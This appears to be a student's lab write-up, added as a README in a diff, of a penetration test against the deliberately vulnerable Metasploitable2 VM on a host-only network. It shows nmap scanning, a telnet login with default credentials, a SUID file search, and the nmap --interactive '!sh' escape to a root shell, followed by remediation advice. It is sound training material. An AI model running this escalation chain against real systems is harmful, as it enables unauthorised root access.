@@ -1,0 +1,215 @@
+# 🛡️ Week 2: Linux Misconfiguration Exploitation (Metasploitable2)
+
+## 📌 Overview
+
+This project demonstrates a full penetration testing workflow against a vulnerable Linux machine (Metasploitable2). The objective was to identify security weaknesses, gain initial access, and escalate privileges to obtain root access.
+
+---
+
+## 🎯 Objectives
+
+* Perform network reconnaissance and service enumeration
+* Identify vulnerable services
+* Gain initial access to the system
+* Perform privilege escalation
+* Achieve root access
+
+---
+
+## 🧪 Lab Environment
+
+| Role       | System          | IP Address      |
+| ---------- | --------------- | --------------- |
+| Attacker   | Parrot OS       | 192.168.56.103  |
+| Target     | Metasploitable2 | 192.168.56.102  |
+| Additional | Windows VM      | 192.168.56.x    |
+| Network    | Host-Only       | 192.168.56.0/24 |
+
+---
+
+## 🔍 Step 1: Network Discovery
+
+### Command:
+
+```bash
+ip a
+```
+
+### Command:
+
+```bash
+ping 192.168.56.102
+```
+
+✔ Confirmed connectivity with target system.
+
+---
+
+## 🔎 Step 2: Port Scanning & Enumeration
+
+### Command:
+
+```bash
+nmap -A 192.168.56.102
+```
+
+### Key Findings:
+
+* FTP (21) — Anonymous access
+* Telnet (23) — Weak authentication
+* SMB (139/445) — Legacy service
+* MySQL (3306) — Open service
+* VNC (5900) — Remote access
+* Bind shell (1524) — Backdoor
+
+---
+
+## 🔐 Step 3: Initial Access (Telnet)
+
+### Command:
+
+```bash
+telnet 192.168.56.102
+```
+
+### Credentials:
+
+```
+Username: msfadmin  
+Password: msfadmin
+```
+
+✔ Successfully gained shell access.
+
+---
+
+## 🔎 Step 4: System Enumeration
+
+### Commands:
+
+```bash
+whoami
+id
+uname -a
+```
+
+✔ Confirmed:
+
+* Non-root user (`msfadmin`)
+* Outdated Linux kernel (vulnerable)
+
+---
+
+## 🚨 Step 5: Privilege Escalation (SUID)
+
+### Command:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+### Key Finding:
+
+```
+/usr/bin/nmap
+```
+
+✔ Nmap had SUID permission (critical misconfiguration)
+
+---
+
+## 💣 Step 6: Exploiting Nmap
+
+### Command:
+
+```bash
+nmap --interactive
+```
+
+### Inside interactive mode:
+
+```bash
+!whoami
+!id
+```
+
+✔ Result:
+
+```
+euid=0(root)
+```
+
+---
+
+## 💀 Step 7: Root Shell Access
+
+### Command:
+
+```bash
+!sh
+```
+
+### Result:
+
+```
+sh-3.2#
+```
+
+✔ Full root access achieved.
+
+---
+
+## 📸 Screenshots
+
+> Add screenshots here:
+
+* Nmap scan results
+* Telnet login
+* Privilege escalation steps
+* Root shell
+
+---
+
+## 🧠 Key Learnings
+
+* Weak/default credentials are dangerous
+* Outdated services increase attack surface
+* SUID misconfigurations can lead to root compromise
+* Proper enumeration is critical in penetration testing
+
+---
+
+## 🛡️ Recommendations
+
+* Disable Telnet (use SSH instead)
+* Enforce strong password policies
+* Remove unnecessary SUID permissions
+* Regularly update systems and services
+* Restrict unnecessary open ports
+
+---
+
+## 🚀 Conclusion
+
+This project demonstrates a complete attack chain:
+
+**Reconnaissance → Enumeration → Initial Access → Privilege Escalation → Root Compromise**
+
+---
+
+## 📚 Skills Demonstrated
+
+* Network scanning (Nmap)
+* Service enumeration
+* Exploitation of weak credentials
+* Linux privilege escalation
+* Post-exploitation techniques
+
+---
+
+## 👩🏽‍💻 Author
+
+**Arinade**
+Aspiring Network Security Analyst
+
+---
